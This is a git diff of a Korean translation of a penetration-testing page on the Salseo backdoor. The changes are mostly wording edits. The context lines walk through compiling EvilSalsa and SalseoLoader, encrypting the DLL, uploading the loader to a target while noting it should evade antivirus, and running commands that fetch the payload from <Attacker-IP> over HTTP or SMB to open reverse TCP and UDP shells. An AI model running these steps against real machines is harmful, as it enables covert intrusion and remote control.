@@ -17,9 +17,9 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## 바이너리 컴파일
 
-github에서 소스 코드를 다운로드하고 **EvilSalsa**와 **SalseoLoader**를 컴파일합니다. 코드를 컴파일하려면 **Visual Studio**가 설치되어 있어야 합니다.
+github에서 소스 코드를 다운로드하고 **EvilSalsa**와 **SalseoLoader**를 컴파일하세요. 코드를 컴파일하려면 **Visual Studio**가 설치되어 있어야 합니다.
 
-사용할 윈도우 박스의 아키텍처에 맞게 프로젝트를 컴파일합니다(윈도우가 x64를 지원하면 해당 아키텍처로 컴파일합니다).
+사용할 윈도우 박스의 아키텍처에 맞게 프로젝트를 컴파일하세요(윈도우가 x64를 지원하면 해당 아키텍처로 컴파일하세요).
 
 **Visual Studio**의 **왼쪽 "Build" 탭**에서 **"Platform Target"**을 통해 **아키텍처를 선택**할 수 있습니다.
 
@@ -27,7 +27,7 @@ github에서 소스 코드를 다운로드하고 **EvilSalsa**와 **SalseoLoader
 
 ![](<../.gitbook/assets/image (839).png>)
 
-그런 다음 두 프로젝트를 빌드합니다 (Build -> Build Solution) (로그 안에 실행 파일의 경로가 나타납니다):
+그런 다음 두 프로젝트를 빌드하세요 (Build -> Build Solution) (로그 안에 실행 파일의 경로가 나타납니다):
 
 ![](<../.gitbook/assets/image (381).png>)
 
@@ -45,7 +45,7 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-알겠습니다. 이제 모든 Salseo 작업을 실행하는 데 필요한 모든 것이 있습니다: **인코딩된 EvilDalsa.dll**과 **SalseoLoader의 바이너리.**
+알겠습니다. 이제 Salseo 작업을 실행하는 데 필요한 모든 것이 있습니다: **인코딩된 EvilDalsa.dll**과 **SalseoLoader의 바이너리.**
 
 **SalseoLoader.exe 바이너리를 머신에 업로드하세요. 어떤 AV에도 탐지되지 않아야 합니다...**
 
@@ -59,7 +59,7 @@ SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Att
 ```
 ### **UDP 리버스 셸 얻기 (SMB를 통한 인코딩된 dll 다운로드)**
 
-리버스 셸 리스너로 nc를 시작하고, 인코딩된 evilsalsa를 제공하기 위해 SMB 서버를 시작하는 것을 잊지 마세요 (impacket-smbserver).
+nc를 리버스 셸 리스너로 시작하고, 인코딩된 evilsalsa를 제공하기 위해 SMB 서버를 시작하는 것을 잊지 마세요 (impacket-smbserver).
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
@@ -100,7 +100,7 @@ Visual Studio를 사용하여 SalseoLoader 프로젝트를 엽니다.
 
 ![](<../.gitbook/assets/image (100).png>)
 
-프로젝트 폴더에 **DllExport.bat** 및 **DllExport\_Configure.bat** 파일이 나타납니다.
+프로젝트 폴더에 **DllExport.bat** 및 **DllExport\_Configure.bat** 파일이 나타났습니다.
 
 ### **U**ninstall DllExport
 
